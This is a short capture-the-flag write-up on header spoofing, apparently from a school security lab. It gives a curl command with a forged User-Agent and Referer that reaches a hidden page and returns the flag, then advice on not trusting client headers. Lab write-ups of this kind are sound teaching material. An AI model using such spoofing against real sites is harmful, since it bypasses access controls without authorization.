# Header Spoofing

The page source contains comments requiring a specific `User-Agent` and `Referer` header to
access a hidden resource. By spoofing these headers, the flag is returned.

## Exploit

```bash
curl --user-agent "ft_bornToSec" \
     --referer "https://www.nsa.gov/" \
     "http://<IP>/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
```

## How to prevent

- Never use client-controlled headers (`User-Agent`, `Referer`, `X-Forwarded-For`, etc.)
  for authentication or authorization — they are fully spoofable
- Protect sensitive resources with server-side authentication (session tokens, credentials)
